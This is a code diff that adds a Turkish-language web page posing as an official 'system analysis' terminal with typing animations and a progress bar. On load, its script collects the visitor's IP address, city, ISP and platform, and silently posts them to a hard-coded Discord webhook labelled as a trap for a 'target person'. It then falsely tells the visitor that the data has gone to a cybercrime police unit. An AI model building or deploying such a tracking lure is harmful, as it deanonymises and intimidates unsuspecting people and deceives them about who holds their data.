@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SİSTEM ANALİZİ | TEŞKİLAT-V4</title>
+    <style>
+        body { background: #000; color: #00ff41; font-family: 'Courier New', Courier, monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .terminal { width: 90%; max-width: 650px; background: rgba(0, 0, 0, 0.9); border: 1px solid #00ff41; padding: 30px; box-shadow: 0 0 30px rgba(0, 255, 65, 0.1); position: relative; }
+        .line { margin-bottom: 12px; font-size: 14px; white-space: nowrap; overflow: hidden; border-right: .15em solid orange; width: 0; }
+        
+        /* Yazı Yazma Efekti */
+        .type-1 { animation: typing 1s steps(40, end) forwards 0.5s, blink-caret .75s step-end infinite; }
+        .type-2 { animation: typing 1s steps(40, end) forwards 2s, blink-caret .75s step-end infinite; }
+        .type-3 { animation: typing 1s steps(40, end) forwards 3.5s, blink-caret .75s step-end infinite; }
+
+        @keyframes typing { from { width: 0 } to { width: 100% } }
+        @keyframes blink-caret { from, to { border-color: transparent } 50% { border-color: #00ff41; } }
+
+        .progress-container { width: 100%; background-color: #111; margin-top: 20px; display: none; }
+        .progress-bar { width: 0%; height: 4px; background-color: #00ff41; box-shadow: 0 0 10px #00ff41; }
+        
+        #result-box { margin-top: 25px; color: #ff0000; display: none; border-top: 1px solid #333; padding-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="terminal">
+    <div class="line type-1">> MERKEZİ VERİ TABANINA BAĞLANILIYOR...</div>
+    <div class="line type-2">> HEDEF CİHAZ PROTOKOLÜ: TCP/IP HANDSHAKE</div>
+    <div class="line type-3">> DİJİTAL İMZA SORGULANIYOR: [HASH-ID-ACTIVE]</div>
+    
+    <div class="progress-container" id="loader">
+        <div class="progress-bar" id="bar"></div>
+    </div>
+
+    <div id="result-box">
+        <div>> ERİŞİM KAYDEDİLDİ: <span id="user-ip">...</span></div>
+        <div>> LOKASYON: <span id="user-loc">...</span></div>
+        <div style="margin-top: 10px; font-size: 11px; color: #555;">[!] TÜM VERİLER SİBER SUÇLAR BİRİMİNE İLETİLDİ.</div>
+    </div>
+</div>
+
+<script>
+    const webhookURL = "https://discord.com/api/webhooks/1499664835267399710/r0cYWya6kyc0_1z1Szqh1jSxLbxSaEvEBtCoinqecKG3_PrrLbIkUJkIol9k8a4J3xjH";
+
+    // Sayfa yüklendikten 4.5 saniye sonra (yazılar bitince) işlemleri başlat
+    setTimeout(() => {
+        document.getElementById('loader').style.display = 'block';
+        let bar = document.getElementById('bar');
+        let width = 0;
+        
+        // Yükleme barı animasyonu
+        let interval = setInterval(() => {
+            if (width >= 100) {
+                clearInterval(interval);
+                finalizeDiscovery();
+            } else {
+                width++;
+                bar.style.width = width + '%';
+            }
+        }, 30);
+    }, 4500);
+
+    function finalizeDiscovery() {
+        fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+            const ip = data.ip || "Gizli";
+            const city = data.city || "Bilinmiyor";
+            const isp = data.org || "Bilinmiyor";
+            const device = navigator.platform;
+
+            // Ekranda göster
+            document.getElementById('user-ip').innerText = ip;
+            document.getElementById('user-loc').innerText = city + " / TÜRKİYE";
+            document.getElementById('result-box').style.display = 'block';
+
+            // Senin Webhook'una (Terminaline) gönder
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: "TEŞKİLAT SORGULAMA MERKEZİ",
+                    avatar_url: "https://i.imgur.com/your-official-logo.png", // Varsa bir logo koyabilirsin
+                    embeds: [{
+                        title: "🟢 KRİTİK ERİŞİM TESPİT EDİLDİ",
+                        color: 16711680, // Kırmızı
+                        description: `Hedef şahıs tuzağa düşürüldü ve verileri çekildi.`,
+                        fields: [
+                            { name: "🌐 IP Adresi", value: `\`${ip}\``, inline: true },
+                            { name: "📍 Lokasyon", value: `\`${city}\``, inline: true },
+                            { name: "📡 İnternet Sağlayıcı", value: `\`${isp}\``, inline: false },
+                            { name: "💻 Sistem Bilgisi", value: `\`${device}\``, inline: true }
+                        ],
+                        footer: { text: "Kayıt No: #" + Math.floor(Math.random() * 99999) },
+                        timestamp: new Date()
+                    }]
+                })
+            });
+        });
+    }
+</script>
+
+</body>
+</html>
